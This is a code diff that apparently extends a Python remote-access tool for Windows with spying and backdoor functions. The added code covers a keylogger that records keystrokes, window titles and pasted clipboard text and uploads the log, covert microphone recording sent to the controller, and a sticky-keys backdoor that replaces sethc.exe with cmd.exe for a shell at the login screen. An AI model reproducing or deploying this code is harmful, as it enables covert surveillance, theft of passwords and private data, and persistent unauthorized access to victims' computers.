@@ -7,15 +7,21 @@ import socket
 import struct
 import subprocess
 import sys
+import threading
 import time
+import wave
 import winreg
 from ctypes import wintypes
 
+import PyHook3
 import cv2
 import ntsecuritycon
 import psutil
+import pyaudio
 import pyautogui
+import pythoncom
 import win32api
+import win32clipboard
 import win32con
 import win32process
 import win32profile
@@ -328,6 +334,122 @@ class ClientUtil:
             return '[+] Process created as administrator'
         except Exception as exception:
             return '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def keylog_start():
+        try:
+            threading.Thread(target=Keylogger().start, daemon=True).start()
+            return '[+] Keylogger started'
+        except Exception as exception:
+            return '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def keylog_stop(client_obj):
+        filename = 'output.txt'
+        client_obj.send_file(filename)
+        if os.path.isfile(filename):
+            os.remove(filename)
+        subprocess.Popen(os.path.realpath(sys.executable))
+        client_obj.socket.close()
+        sys.exit(0)
+
+    @staticmethod
+    def record(client_obj, seconds):
+        CHUNK = 1024
+        FORMAT = pyaudio.paInt16
+        CHANNELS = 2
+        RATE = 44100
+        filename = 'output.wav'
+        try:
+            try:
+                RECORD_SECONDS = int(seconds)
+            except:
+                RECORD_SECONDS = 10
+            p = pyaudio.PyAudio()
+            stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
+            client_obj.send('[+] Start recording')
+        except Exception as exception:
+            client_obj.send('[-] Error: ' + str(exception))
+            return
+        try:
+            frames = []
+            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+                data = stream.read(CHUNK)
+                frames.append(data)
+            stream.stop_stream()
+            stream.close()
+            p.terminate()
+            f = wave.open(filename, 'wb')
+            f.setnchannels(CHANNELS)
+            f.setsampwidth(p.get_sample_size(FORMAT))
+            f.setframerate(RATE)
+            f.writeframes(b''.join(frames))
+            f.close()
+            client_obj.send_file(filename)
+            if os.path.isfile(filename):
+                os.remove(filename)
+            client_obj.send('[+] Record success')
+        except Exception as exception:
+            client_obj.send('[-] Error: ' + str(exception))
+
+    @staticmethod
+    def replace_files():
+        try:
+            sys_dir = r'C:\Windows\System32'
+            if os.path.isfile(sys_dir + r'\sethc.exe.bak'):
+                return '[-] File already exists'
+            cmd_list = [r'takeown /f %s\sethc.exe' % sys_dir,
+                        r'icacls %s\sethc.exe /grant administrators:F' % sys_dir,
+                        r'move {0}\sethc.exe {0}\sethc.exe.bak'.format(sys_dir),
+                        r'copy {0}\cmd.exe {0}\sethc.exe'.format(sys_dir)]
+            result = ''
+            for cmd in cmd_list:
+                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
+            return result
+        except Exception as exception:
+            return '[-] Error: ' + str(exception)
+
+
+def get_time():
+    return str(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()))
+
+
+class Keylogger(object):
+
+    def __init__(self):
+        self.window_name = ''
+        with open('output.txt', 'a') as f:
+            f.write('\n[+] ' + get_time() + ' Keylogger started' + '\n')
+            f.close()
+
+    def onKeyboardEvent(self, event):
+        if 32 < event.Ascii < 127:
+            data = chr(event.Ascii)
+        else:
+            if event.Key == 'V':
+                try:
+                    win32clipboard.OpenClipboard()
+                    pasted_data = win32clipboard.GetClipboardData()
+                    win32clipboard.CloseClipboard()
+                    data = event.Key + ' ' + pasted_data
+                except:
+                    data = event.Key
+            else:
+                data = event.Key
+        with open('output.txt', 'a') as f:
+            if str(event.WindowName) != self.window_name:
+                self.window_name = str(event.WindowName)
+                f.write('\n\n[+] ' + get_time() + '\n' + self.window_name + '\n')
+            f.write(data + ' ')
+        f.close()
+        return True
+
+    def start(self):
+        hook_manager = PyHook3.HookManager()
+        hook_manager.KeyDown = self.onKeyboardEvent
+        hook_manager.HookKeyboard()
+        pythoncom.PumpMessages()
 
 
 class STARTUPINFO(ctypes.Structure):
